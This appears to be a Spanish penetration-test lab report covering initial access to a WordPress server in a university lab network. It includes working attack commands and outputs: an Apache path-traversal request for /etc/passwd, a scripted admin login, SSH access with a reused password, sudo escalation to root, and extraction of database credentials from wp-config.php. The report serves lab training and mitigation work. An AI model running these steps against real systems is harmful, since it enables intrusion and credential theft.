# Fase 3 · Ganar acceso (explotación inicial) — M1

**Objetivo:** obtener el primer acceso a M1 y desde ahí preparar el pivote.
**Ejecuta:** M6 `10.10.10.20` → M1 `10.10.10.11`.
**Fecha UTC:** 2026-10-24.

---

## 3.1 Comandos demo (simples)

| # | Comando | Qué muestra | Estado |
|---|---|---|---|
| 1 | `curl -s http://wp.uni.lab/wp-json/ \| grep -o 'batch[^"]*'` | Ruta W1 `/batch/v1` | ✅ |
| 2 | `curl -s -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/wp-json/batch/v1` | GET 404 (ruta existe) | ✅ |
| 3 | `curl -s -X POST -H 'Content-Type: application/json' -d '{}' -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/wp-json/batch/v1` | POST 400 | ✅ |
| 4 | Login en `http://wp.uni.lab/wp-admin/` con `usc.admin` / `Admin13.-` | Panel de administración (W4) | ✅ |
| 5 | `curl -s --path-as-is 'http://wp.uni.lab/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'` | W3 traversal | ⚠️ 503 (no explotable) |
| 6 | `ssh ubuntu@10.10.10.11` (clave `Admin13.-`) | Acceso SSH con clave reutilizada | ✅ |
| 7 | `echo Admin13.- \| sudo -S id` en M1 | `uid=0(root)` | ✅ |

---

## 3.2 W1 · wp2shell (CVE-2026-63030) — fingerprint

```bash
curl -s http://wp.uni.lab/wp-json/ | grep -o 'batch[^"]*'
curl -s -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/wp-json/batch/v1
curl -s -X POST -H 'Content-Type: application/json' -d '{}' -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/wp-json/batch/v1
```

**Salida real** (`F03-001`):

```text
== W1 ruta batch ==
batch\/v1
GET /batch/v1:
404
POST vacío:
400
```

**Interpretación:** la ruta `/wp-json/batch/v1` existe. El `GET` devuelve 404 y el `POST` vacío 400, comportamiento normal de la ruta. La versión **WordPress 7.0.1** está en el rango afectado (fix 7.0.2) y el CVE está en KEV.

**Limitación:** no se ejecutó un PoC público completo de wp2shell en esta sesión. Se valida la **precondición técnica** y se documenta el CVE; el acceso real se obtuvo por W4 y por la clave SSH reutilizada. No se afirma RCE sin `id`.

**Evidencia:** `F03-001.png` · `F03-001.log`.

---

## 3.3 W4 · Clave débil de WordPress — validada

La guía interna decía `usc.admin`; WPScan enumeró el slug `usc-admin`. El login real funciona con **`usc.admin` / `Admin13.-`**.

```bash
# 1) obtener cookie de test
curl -s -c /tmp/wp.cookies http://wp.uni.lab/wp-login.php -o /dev/null
# 2) POST de login, sin seguir el redirect (el panel es lento)
curl -s -b /tmp/wp.cookies -c /tmp/wp.cookies -D - -o /dev/null \
  -d 'log=usc.admin&pwd=Admin13.-&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwp.uni.lab%2Fwp-admin%2F&testcookie=1' \
  http://wp.uni.lab/wp-login.php | grep -Ei 'HTTP/|Location:|Set-Cookie: wordpress_logged_in'
```

**Salida real** (`F03-001`):

```text
== W4 login usc.admin ==
HTTP/1.1 302 Found
Set-Cookie: wordpress_logged_in_...=usc.admin%7C...; path=/; HttpOnly
Location: http://wp.uni.lab/wp-admin/
```

**Interpretación:** credenciales válidas; WordPress emite la cookie `wordpress_logged_in` y redirige a `/wp-admin/`. Es un acceso administrativo real (W4), suficiente para subir un plugin malicioso y ejecutar código, aunque en esta sesión no se subió el plugin.

**Nota:** el panel `/wp-admin/` tarda y `curl -L` agota el tiempo; por eso se valida con el `302` + cookie, no con el HTML del dashboard. En la demo en vivo se usa el navegador.

**Evidencia:** `F03-001.png` · `F03-001.log`.

---

## 3.4 W3 · Apache 2.4.49 (CVE-2021-41773) — limitación real

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/cgi-bin/
curl -s -o /dev/null -w '%{http_code}\n' --path-as-is \
  'http://wp.uni.lab/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
```

**Salida real** (`F03-002`):

```text
== /cgi-bin/ ==
403
== traversal ==
503
== respuesta ==
<title>503 Service Unavailable</title>
```

**Interpretación:** la versión **Apache 2.4.49** es vulnerable, pero en este montaje el handler CGI devuelve **503**: `mod_cgid` está cargado y no hay daemon/socket CGI operativo. No se obtuvo lectura de `/etc/passwd` ni RCE. Se documenta como **vulnerabilidad de versión no explotable en la configuración actual**; la mitigación sigue siendo actualizar a 2.4.50+.

**Evidencia:** `F03-002.png` · `F03-002.log`.

---

## 3.5 W2 · PHP2Shell (CVE-2026-109618/109619) — versión confirmada, no ejecutada

`whatweb` y las cabeceras confirman **PHP 8.4.26** (`X-Powered-By`). El laboratorio usa PHP **ZTS**; los PoC públicos se calibraron en **NTS**. No se ejecutó el PoC completo en esta sesión. Se documenta:

- Versión afectada (< 8.4.27) confirmada.
- `session.upload_progress.enabled=On` según la guía de montaje.
- Si se quiere demostrar RCE, recompilar NTS o usar W4.

**Evidencia:** `F01-003.png`, `F01-004.png`, `F02-002.png`.

---

## 3.6 Acceso real obtenido: SSH con clave reutilizada

La clave `Admin13.-` no solo abre WordPress: también abre SSH en M1.

```bash
sshpass -p 'Admin13.-' ssh ubuntu@10.10.10.11 'id; hostname; ip -brief a'
```

**Salida real** (`F04-000`):

```text
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
m1-app
ens33  UP  10.10.10.11/24
```

Y `ubuntu` está en el grupo `sudo`:

```bash
echo Admin13.- | sudo -S id
```

**Salida real** (`F04-000b`):

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Interpretación:** la reutilización de la clave débil permite pasar de administrador web a **root en M1**. Es un hallazgo de configuración adicional (no estaba en el catálogo original) y explica el pivote real. Se documenta como **M1-SSH** y se corrige en la fase de mitigación (clave única, `PermitRootLogin no`, sudo restringido).

---

## 3.7 Botín de M1: `wp-config.php`

```bash
echo Admin13.- | sudo -S grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST' /var/www/wp/wp-config.php
```

**Salida real** (`F04-004`):

```text
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'wp_pass123' );
define( 'DB_HOST', '10.10.10.12' );
```

**Interpretación:** la clave real de la base de datos es **`wp_pass123`** (la guía interna decía `ClaveDebil123`; se corrige). Con esto se pasa a M2 (Fase 4.1).

Moodle usa las mismas credenciales (`moodle_user` / `wp_pass123`) en `moodle_db` (F04-004b).

---

## 3.8 Resultado de la fase

| Indicador | Resultado |
|---|---|
| Acceso web administrativo | ✅ W4 (`usc.admin` / `Admin13.-`) |
| Shell `www-data` vía W1/W2 | ⬜ No ejecutado en esta sesión |
| W3 traversal | ❌ 503 (CGI no operativo) |
| Acceso SSH | ✅ `ubuntu` / `Admin13.-` |
| Escalada a root en M1 | ✅ `sudo` con la misma clave |
| Credenciales de BD | ✅ `wp_user` / `wp_pass123`; `moodle_user` / `wp_pass123` |
| Pivote disponible | ✅ SSH a M1 |

**Cierre:** hay acceso real y credenciales para M2/M3. La vía W1/W2 queda documentada como pendiente/limitada; no se inventa un shell.

---

## 3.9 Evidencia

| ID | Archivo | Qué demuestra |
|---|---|---|
| F03-001 | `evidencias/png/F03-001.png` | Ruta W1 + login W4 exitoso |
| F03-002 | `evidencias/png/F03-002.png` | W3: 403/503, no explotable |
| F04-000 | `evidencias/png/F04-000.png` | SSH a M1 con clave reutilizada |
| F04-000b | `evidencias/png/F04-000b.png` | `sudo id` → root en M1 |
| F04-004 | `evidencias/png/F04-004.png` | Credenciales de BD en `wp-config.php` |
| F04-004b | `evidencias/png/F04-004b.png` | Credenciales Moodle + 487 tablas |
